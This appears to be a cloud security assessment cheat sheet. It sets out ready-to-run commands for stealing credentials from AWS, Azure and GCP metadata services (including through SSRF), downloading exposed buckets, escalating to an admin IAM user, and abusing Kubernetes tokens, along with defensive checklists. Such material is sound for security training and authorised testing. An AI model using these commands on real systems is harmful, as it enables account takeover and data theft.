# Cloud Security - AWS, Azure, GCP Exploitation

## AWS Security Assessment

### IAM Misconfigurations

#### Overly Permissive Policies
```json
{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}
```
→ **CRITICAL**: Full AWS account access

#### Common Weak Policies
- `AdministratorAccess` attached to service accounts
- `PowerUserAccess` with IAM permissions
- Wildcard principals: `"Principal": "*"`

#### Detection Commands
```bash
# List IAM users with admin access
aws iam list-users | jq -r '.Users[].UserName' | \
  xargs -I {} aws iam list-attached-user-policies --user-name {} | \
  grep AdministratorAccess

# Check for inline policies (often overlooked)
aws iam list-users | jq -r '.Users[].UserName' | \
  xargs -I {} aws iam list-user-policies --user-name {}
```

---

### S3 Bucket Exploitation

#### Public Bucket Discovery
```bash
# Check if bucket is publicly accessible
aws s3 ls s3://target-bucket --no-sign-request

# Download entire bucket
aws s3 sync s3://target-bucket . --no-sign-request

# Common bucket naming patterns
company-backups
company-logs
company-prod
company-assets
<company>-<env>-<service>
```

#### ACL Misconfigurations
```bash
# Check bucket ACL
aws s3api get-bucket-acl --bucket target-bucket

# Look for:
{
  "Grantee": {
    "Type": "Group",
    "URI": "http://acs.amazonaws.com/groups/global/AllUsers"
  },
  "Permission": "READ"  # or WRITE (critical!)
}
```

#### Bucket Policies
```json
// Vulnerable policy (public read)
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::bucket-name/*"
  }]
}
```

---

### EC2 Instance Metadata Service (IMDS)

#### Metadata V1 (Vulnerable)
```bash
# From compromised EC2 instance or SSRF
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Extract credentials
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2024-01-01T00:00:00Z"
}
```

#### IMDSv2 (More Secure, but bypassable)
```bash
# Requires session token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

#### SSRF to IMDS Exploitation
```python
# Via SSRF vulnerability
payload = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
requests.get(f"https://target.com/fetch?url={payload}")
```

---

### Lambda Function Security

#### Common Issues
1. **Overly Permissive Execution Roles**
   ```json
   {
     "Action": ["s3:*", "dynamodb:*", "lambda:*"],
     "Resource": "*"
   }
   ```

2. **Environment Variables with Secrets**
   ```bash
   aws lambda get-function --function-name MyFunction
   # Check for DB_PASSWORD, API_KEY in environment
   ```

3. **Public Lambda Function URLs**
   ```bash
   curl https://<id>.lambda-url.<region>.on.aws/
   # If no auth, anyone can invoke
   ```

---

### AWS Access Key Exposure

#### Discovery Locations
```bash
# GitHub search
"AKIA" site:github.com "company-name"

# Common files
.env
config.php
appsettings.json
credentials.xml
```

#### Validation
```bash
# Test if keys are valid
aws sts get-caller-identity \
  --aws-access-key-id AKIA... \
  --aws-secret-access-key ...

# Enumerate permissions
aws iam get-user
aws s3 ls
aws ec2 describe-instances
```

#### Privilege Escalation Paths
```bash
# Create admin user (if you have iam:CreateUser)
aws iam create-user --user-name attacker
aws iam attach-user-policy --user-name attacker \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create access keys
aws iam create-access-key --user-name attacker
```

---

## Azure Security Assessment

### Azure AD Misconfigurations

#### Guest User Enumeration
```powershell
# Using Azure CLI
az ad user list --query "[?userType=='Guest']"

# Excessive guest permissions = data leak risk
```

#### Service Principal Secrets
```bash
# List service principals
az ad sp list --all

# Check for exposed credentials
az ad sp credential list --id <sp-object-id>
```

---

### Azure Storage Account

#### Public Blob Containers
```bash
# Check for public access
curl https://<account>.blob.core.windows.net/<container>?restype=container&comp=list

# Common container names
backups, logs, assets, public, static, uploads
```

#### SAS Token Abuse
```bash
# Shared Access Signature (SAS) with excessive permissions
?sv=2021-06-08&ss=b&srt=sco&sp=rwdlac&se=2025-01-01...

# sp=rwdlac means:
# r=read, w=write, d=delete, l=list, a=add, c=create
# If leaked, full container access!
```

---

### Azure Function App Security

#### Check for Anonymous Auth
```bash
curl https://<function-app>.azurewebsites.net/api/function-name

# If 200 OK without auth → vulnerable
```

#### Managed Identity Exploitation
```bash
# From compromised Azure VM/Function
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
  -H Metadata:true

# Use token to access Azure resources
```

---

## GCP Security Assessment

### GCP IAM Issues

#### Overly Permissive Service Accounts
```bash
# List service accounts
gcloud iam service-accounts list

# Check IAM policy bindings
gcloud projects get-iam-policy <project-id>

# Look for:
roles/owner  # Full project access
roles/editor # Can modify resources
```

---

### GCS Bucket Exploitation

#### Public Bucket Check
```bash
# List public buckets
gsutil ls gs://target-bucket

# Download without auth
gsutil -m cp -r gs://target-bucket ./
```

#### Bucket Metadata Enumeration
```bash
# Get bucket IAM policy
gsutil iam get gs://target-bucket

# Check for allUsers or allAuthenticatedUsers
```

---

### GCE Metadata Service

#### Instance Metadata API
```bash
# Default service account token
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Get project ID
curl "http://metadata.google.internal/computeMetadata/v1/project/project-id" \
  -H "Metadata-Flavor: Google"
```

#### SSRF to Metadata
```python
# Via SSRF
payload = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
headers = {"Metadata-Flavor": "Google"}
```

---

## Kubernetes Security (EKS, AKS, GKE)

### Pod Escape Techniques

#### Privileged Containers
```yaml
# Check if pod is privileged
securityContext:
  privileged: true
```
→ Can access host filesystem, escape container

#### Host Path Mounts
```yaml
volumes:
- name: hostroot
  hostPath:
    path: /
```
→ Mount host root FS, read SSH keys, cron jobs

---

### Service Account Token Abuse
```bash
# Default service account token location
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Use token to query K8s API
curl -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces
```

---

### RBAC Misconfigurations
```yaml
# Dangerous ClusterRoleBinding
kind: ClusterRoleBinding
metadata:
  name: bad-binding
roleRef:
  kind: ClusterRole
  name: cluster-admin  # Full cluster access
subjects:
- kind: ServiceAccount
  name: default  # Given to all pods!
  namespace: default
```

---

## Cloud Security Tools

### AWS
- **ScoutSuite**: Multi-cloud security auditing
- **Prowler**: AWS security best practices assessment
- **CloudMapper**: Visualize AWS environments
- **Pacu**: AWS exploitation framework

### Azure
- **ScoutSuite**: Azure security audit
- **ROADtools**: Azure AD exploitation
- **Stormspotter**: Azure attack path analysis

### GCP
- **ScoutSuite**: GCP security assessment
- **gcpbucketbrute**: GCS bucket enumeration

### Kubernetes
- **kube-hunter**: K8s penetration testing
- **kubeaudit**: Audit K8s clusters
- **kubectl-who-can**: RBAC analysis

---

## Cloud Attack Chains

### Chain 1: SSRF → AWS Metadata → S3 Exfiltration
```
1. Find SSRF vulnerability
2. Access http://169.254.169.254/latest/meta-data/iam/...
3. Extract AWS credentials
4. aws s3 sync s3://company-secrets ./
```

### Chain 2: Public S3 Bucket → AWS Keys → Account Takeover
```
1. Find public S3 bucket (gsutil/s3 ls)
2. Discover .env file with AWS_ACCESS_KEY_ID
3. Validate keys: aws sts get-caller-identity
4. Escalate: aws iam create-user + attach-user-policy
```

### Chain 3: Azure Function Anonymous Auth → Managed Identity → Key Vault
```
1. Find Azure Function with no auth
2. Call function to trigger Managed Identity
3. Get token: http://169.254.169.254/metadata/identity/...
4. Access Key Vault: az keyvault secret list --vault-name <name>
```

---

## Cloud Security Checklist

### AWS
- [ ] IAM policies follow least privilege
- [ ] MFA enabled on root account
- [ ] S3 buckets have ACL restrictions
- [ ] EC2 instances use IMDSv2
- [ ] CloudTrail logging enabled
- [ ] Security groups restrict inbound traffic

### Azure
- [ ] Service principals have least privilege
- [ ] Storage accounts disable public access
- [ ] Managed Identities used (no hardcoded creds)
- [ ] Azure AD Conditional Access policies
- [ ] Network Security Groups (NSGs) configured

### GCP
- [ ] Service accounts follow least privilege
- [ ] GCS buckets not publicly accessible
- [ ] VPC firewall rules restrictive
- [ ] Audit logs enabled
- [ ] IAM recommender used for privilege reduction

---

## References
- AWS Security Best Practices: https://aws.amazon.com/security/best-practices/
- Azure Security Documentation: https://docs.microsoft.com/en-us/azure/security/
- GCP Security Best Practices: https://cloud.google.com/security/best-practices
- Kubernetes Security: https://kubernetes.io/docs/concepts/security/
